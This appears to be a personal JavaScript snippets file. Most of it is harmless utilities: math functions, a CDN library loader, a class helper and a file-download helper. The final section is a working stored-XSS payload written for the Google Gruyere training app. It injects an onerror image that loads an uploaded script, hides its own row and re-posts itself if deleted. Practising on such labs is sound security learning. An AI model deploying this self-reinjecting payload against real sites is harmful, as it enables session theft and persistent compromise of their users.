
//sqrt function with recursive anonymous functions:
var sqrt = value => start => precision => ((y => y(y))(f => i => v => i >= precision ? v : f(f)(i + 1)((v + value / v) * 0.5))(0)(start));

var sqrt2 = number => (x => ((y => y(y))(f => v => (v * v - x < 0 ? x - v * v : v * v - x) <= 0.0000000001 ? v : f(f)((v + x / v) * 0.5))(x * 0.25)))(number);


//lil chrome extension experiment to load libraries to the console (jQuery.js, KO.js)
function All() {
    if (window.log == undefined)
        window.log = function (text) { console.log(text) };
    else console.log("'log' is already defined.");

    if (window.$$ == undefined)
        window.$$ = (function () {
            return {
                jQuery: 'https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js',
                KO: 'https://cdnjs.cloudflare.com/ajax/libs/knockout/3.4.2/knockout-min.js',
                addScript: function (url) {
                    if (typeof url != 'string')
                        return "Invalid url.";
                    var script = document.createElement('script');
                    script.type = 'text/javascript';
                    script.src = url;
                    document.head.appendChild(script);
                }
            }
        })();
    else console.log("'$$' is already defined.");
}

document.head.appendChild(document.createElement('script').appendChild(document.createTextNode('(' + All + ')();')).parentNode);


//Javascript function to create a class:
Reflect.createClass = (function () {
    var isFunction = (functionToCheck) => functionToCheck && ({}).toString.call(functionToCheck) === '[object Function]';

    return function (name, privateMembers, publicMembers) {
        window[name] = (function () {
            var _private = Object.assign({}, privateMembers);
            var _public = Object.assign({}, publicMembers);
            return function () {
                var self = {};
                var that = this;
                for (var m in _private)
                    if (_private.hasOwnProperty(m))
                        if (isFunction(_private[m]))
                            self[m] = (function () { var curr = m; return function () { return _private[curr].apply(that, [self].concat(Array.prototype.slice.call(arguments))); }; })();
                        else self[m] = _private[m];

                for (var m in _public)
                    if (_public.hasOwnProperty(m))
                        if (isFunction(_public[m]))
                            this[m] = (function () { var curr = m; return function () { return _public[curr].apply(that, [self].concat(Array.prototype.slice.call(arguments))); }; })();
                        else this[m] = _public[m];
            }
        })();
    }
})();


//function to download a bunch of text as a file:
console.download = function (name, text) {
    var reader = new FileReader();
    reader.onload = function () {
        var link = document.createElement('a');
        link.download = name;
        link.href = reader.result;
        link.style.display = 'none';
        link.click();
        document.body.appendChild(link);
    }
    reader.readAsDataURL(new Blob([text], { type: 'application/octet-stream' }));
}


//Paste in url to create a console in a web page:
var url = 'data:text/html, <html><head><script>function execute(){eval(script.innerText)}</script></head><body><div style="width:100%;height:90%" id=script contenteditable></div><button style="width:200px;margin:0 auto;height:8%" onclick=execute()>Execute</button></body></html>';


//No idea
function Newton(fun, der, guess) {

    return guess - fun(guess) / der(guess);

}

function CalcSteps(initialGuess, targetResult, fun, derivative) {
    var i = 0;
    while (initialGuess != targetResult && initialGuess != -targetResult && initialGuess != -Infinity && initialGuess != NaN) {
        initialGuess = initialGuess - fun(initialGuess) / derivative(initialGuess);
        i++;
    }
    return i;
}

function PlotSteps(stepsFun, minInitial, maxInitial, step) {
    var vals = [];
    for (var i = minInitial; i <= maxInitial; i += step)
        vals.push(stepsFun(i));
    ctx.clearRect(0, 0, 300, 150);
    ctx.beginPath();
    var maxVal = Number.MIN_SAFE_INTEGER;
    for (var i = 0; i < vals.length; i++)
        if (vals[i] > maxVal) maxVal = vals[i];
    var facX = 300 / vals.length, facY = 150 / (maxInitial - minInitial);
    for (var i = 0; i < vals.length; i++)
        if (i == 0)
            ctx.moveTo(facX * i, facY * (vals[i] - minInitial));
        else ctx.lineTo(facX * i, facY * (vals[i] - minInitial));
    ctx.stroke();
}


var stepsFun = x => CalcSteps(x, 5, y => y * y - 25, y => 2 * y);


//Some code I wrote while playing with google-gruyere:
function loadShit() {
    var r = new XMLHttpRequest();
    r.open('get', 'https://google-gruyere.appspot.com/473031374733925903961984636996275661103/newsnippet2?snippet=%3Cimg%20id%3D%27xssimg123%27%20src%20onerror%3D%22var%20s%3Ddocument.createElement(%27script%27)%3Bs.id%3D%27xss123%27%3Bs.setAttribute(%27src%27%2C%27https%3A%2F%2Fgoogle-gruyere.appspot.com%2F473031374733925903961984636996275661103%2Fboy.mc%40facto%2Fxss2.js%27)%3Bdocument.head.appendChild(s)%22%20%2F%3E');
    r.send();
}
function whichChild(elem) {
    var i = 0;
    while ((elem = elem.previousElementSibling) != null)
        ++i;
    return i;
}
var img = document.getElementById('xssimg123');
var tr = img.parentElement.parentElement.parentElement;
var tbody = tr.parentElement;
var imgIndex = whichChild(tr), allTrs = tbody.children.length;
tr.style.display = 'none';
for (var i = imgIndex + 1; i < allTrs; i++) {
    tbody.children[i].children[0].textContent = i - 1;
}

var r = new XMLHttpRequest();
r.addEventListener('load', function () {
    if (!/id='xssimg123'/.test(this.responseText))
        loadShit();
});
r.open('get', 'https://google-gruyere.appspot.com/473031374733925903961984636996275661103/snippets.gtl');
r.send();

var anywayScript = document.createElement('script');
anywayScript.setAttribute('src', 'https://google-gruyere.appspot.com/473031374733925903961984636996275661103/boy.mc@facto/anywayScript.js');
document.head.appendChild(anywayScript);


//